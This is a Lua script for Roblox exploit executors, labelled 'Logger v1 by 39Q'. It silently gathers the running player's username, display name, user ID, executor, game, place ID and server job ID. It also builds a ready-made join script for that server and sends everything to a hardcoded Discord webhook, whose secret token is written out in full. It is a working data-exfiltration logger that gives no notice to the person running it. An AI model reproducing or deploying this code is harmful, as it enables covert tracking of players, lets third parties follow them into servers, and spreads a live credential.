local Http = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local WebhookUrl = "https://discord.com/api/webhooks/1379321018929385472/SSAWjhUKLLu1heifUp4-NoPRiw0ty-tLp20dHIo7q6v8qUY3TuHvSA8A-NAFVRFqi5kv"
local executor = identifyexecutor() or "Unknown Executor"

-- Get current server's JobId
local currentJobId = game.JobId

-- Function to generate join script for current game
local function generateJoinScript()
    return "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
        game.PlaceId .. ", '" .. currentJobId .. "', game.Players.LocalPlayer)"
end

-- Function to get game name
local function getGameName()
    local success, result = pcall(function()
        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    end)
    return success and result.Name or game.Name
end

local function sendRequest()
    local player = game.Players.LocalPlayer
    local displayName = player and player.DisplayName or "N/A"
    local userName = player and player.Name or "N/A"
    local playerId = player and player.UserId or 0
    local gameName = getGameName()
    local placeId = game.PlaceId

    -- Generate join script with current JobId
    local joinScript = generateJoinScript()

    return {
        Url = WebhookUrl,
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = Http:JSONEncode({
            ["content"] = "**Logger v1 by 39Q**",
            ["embeds"] = {{
                ["author"] = {
                    ["name"] = "Zte hub Server"
                },
                ["title"] = userName .. " | " .. displayName,
                ["type"] = "rich",
                ["color"] = tonumber(0x00FF00),
                ["thumbnail"] = {
                    ["url"] = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
                },
                ["fields"] = {
                    {
                        ["name"] = "Executor",
                        ["value"] = "```" .. executor .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Game",
                        ["value"] = "```" .. gameName .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Place ID",
                        ["value"] = "```" .. placeId .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Job ID",
                        ["value"] = "```" .. currentJobId .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Join Script",
                        ["value"] = "```lua\n" .. joinScript .. "\n```",
                        ["inline"] = false
                    }
                }
            }}
        })
    }
end

-- HTTP request handling
if syn then
    syn.request(sendRequest())
else
    request = (http_request or request or HttpPost or syn.request)
    request(sendRequest())
end
